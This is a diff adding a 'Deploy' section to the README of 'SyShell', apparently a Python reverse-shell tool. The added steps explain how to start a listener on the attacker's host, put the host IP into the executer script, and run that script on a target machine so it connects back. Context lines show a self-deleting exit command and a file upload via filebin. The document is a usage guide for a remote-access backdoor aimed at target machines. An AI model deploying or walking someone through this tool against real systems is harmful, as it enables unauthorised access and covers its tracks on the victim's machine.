@@ -23,8 +23,47 @@ filebin <YOUR BIN ID> <YOUR FILE NAME>
 - `!!terminus` : **Exits the session and deletes itself from the target machine.**
 - `echo` : `echo <string>`
 - `upload` : Currently unavailable / Doesn't work yet.
+  
 ![SyShell Menu.](images/help.jpg)
 
+
+# Deploy
+
+First install required packages.
+## Requirements
+There's 2 ways to install the required packages / libraries:
+
+1. Simply run : 
+```shell
+chmod +x build.sh && ./build.sh
+```
+2. Just use pip:
+```py
+pip install -r requirements.txt
+```
+Either will work.
+
+Next step is to deploy.
+## Start
+- Firstly, start the listener on your host machine, by using: 
+```py
+python SyShell_Receiver.py
+```
+OR
+```py
+python3 SyShell_Receiver.py
+```
+- Secondly, update your IP address ( Host Machine's Address. ) , you could just run `ifconfig` (linux) or `ipconfig` on windows, and get your host's machine ip address then either run: 
+```bash
+chmod +x host_ip.sh && ./host_ip.sh <YOUR HOST MACHINE IP ADDRESS>
+```
+OR: Simply manually open up `SyShell_executer.py` and change (line 26) : 
+```
+host = 'HOST MACHINE IP ADDRESS'  # HOST MACHINE IP
+```
+- Finally, on your target machine, run `python SyShell_executer.py` or `python3 SyShell_executer.py` and you should receive a connection back:
+
+![SyShell Menu.](images/shell.png)
 
 
 # Disclaimer
